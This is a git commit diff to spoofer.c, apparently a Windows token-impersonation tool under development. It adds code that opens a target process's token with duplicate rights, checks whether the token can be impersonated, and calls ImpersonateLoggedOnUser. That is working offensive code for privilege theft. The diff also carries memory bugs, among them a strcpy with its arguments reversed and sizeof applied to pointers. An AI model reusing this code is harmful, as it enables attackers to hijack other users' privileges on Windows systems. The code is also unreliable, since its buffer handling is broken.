54ba0d78c237eb6810e0fabe25616f9dca1b8e18
AleksaZatezalo <zabumaphu@gmail.com>
2024-09-24 19:52:21 -0500

    Almost there!

--- spoofer.c
+++ spoofer.c
@@ -35,7 +35,7 @@ char *PrintUserInfoFromToken(DWORD processId) {
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
     char *error = "ERROR";
     char *result;
-    char *banner = "ASSOCIATED USER: ";
+    char *banner = "[+] Associated user: ";
     if (hProcess == NULL) {
         printf("Error opening process: %d\n", GetLastError());
         return error;
@@ -59,6 +59,16 @@ char *PrintUserInfoFromToken(DWORD processId) {
         return error;
     }
 
+    BOOL canImpersonate = FALSE;
+    char *impString;
+    if (GetTokenInformation(hToken, TokenType, &canImpersonate, sizeof(BOOL), &tokenInfoLength) &&
+        canImpersonate == TokenImpersonation) {
+        impString = "\r\n[+] You can impersonate with this token.\r\n";
+    } else {
+        impString = "\r\n[-] You cannot impersonate with this token.\r\n";
+    }
+
+
     // Convert SID to string
     LPTSTR sidString;
     if (ConvertSidToStringSid(pTokenUser->User.Sid, &sidString)) {
@@ -79,11 +89,12 @@ char *PrintUserInfoFromToken(DWORD processId) {
         result = "ERROR: Process potentially terminated.";
     }
 
-    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + 2)*sizeof(char));
+    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + strlen(impString) + 2)*sizeof(char));
     strcpy(result, banner);
     strcat(result, domainName);
     strcat(result, "\\");
     strcat(result, userName);
+    strcat(result, impString);
 
     // Cleanup
     free(userName);
@@ -98,28 +109,50 @@ char *impersonate(int pid){
     HANDLE currentTokenHandle = NULL;
     HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
     int error= GetLastError();
+    char *ret_message;
 
     char *open_proc;
     if (error == 0) {
-        open_proc = "[+] OpenProcess() success!\n";
+        open_proc = "[+] OpenProcess() success!\r\n";
     } else {
-        open_proc = "[-] OpenProccess() failed!\n";
-        return open_proc;
+        open_proc = "[-] OpenProccess() failed!\r\n";
+        ret_message = malloc(strlen(open_proc) * sizeof(char) + 2);
+        strcpy(open_proc, ret_message);
+        return ret_message;
     }
     
     char *open_token;
     BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &currentTokenHandle);
     error = GetLastError();
     if (error == 0){
-        open_token = "[+] OpenProcessToken() success!\n";
+        open_token = "[+] OpenProcessToken() success!\r\n";
     } else {
-        open_token = "[-] OpenProcessToken() failed!\n";
+        open_token = "[-] OpenProcessToken() failed!\r\n";
+        ret_message = malloc((sizeof(open_proc) + sizeof(open_token) + 2));
+        strcpy(ret_message, open_proc);
+        strcat(ret_message, open_token);
+        return ret_message;
     }
 
-    char *suc_proc;
-    strcat(suc_proc, open_proc);
-    strcat(suc_proc, open_token);
-    return suc_proc;
+       if (!ImpersonateLoggedOnUser(currentTokenHandle)) {
+        char *errorMsg = "[-] Impersonation Failed.\r\n";
+        ret_message = malloc((sizeof(errorMsg) + sizeof(open_token) + sizeof(open_proc)) + 2);
+        strcpy(ret_message, open_proc);
+        strcat(ret_message, open_token);
+        strcat(ret_message, errorMsg);
+        return ret_message;
+    }
+    char *imp_result;
+    if (GetLastError() == 0){
+        imp_result = "[+] ImpersonatedLoggedOnUser() success!\r\n";
+    } else {
+        imp_result = "[-] ImpersonatedLoggedOnUser() Return Code: 1 \r\n";
+    }
+    ret_message = malloc(sizeof(open_proc) + sizeof(open_token) + sizeof(imp_result) + 2);
+    strcpy(ret_message, open_proc);
+    strcat(ret_message, open_token);
+    strcat(ret_message, imp_result);
+    return ret_message;
 }
 
 void PrintError(LPTSTR msg) {
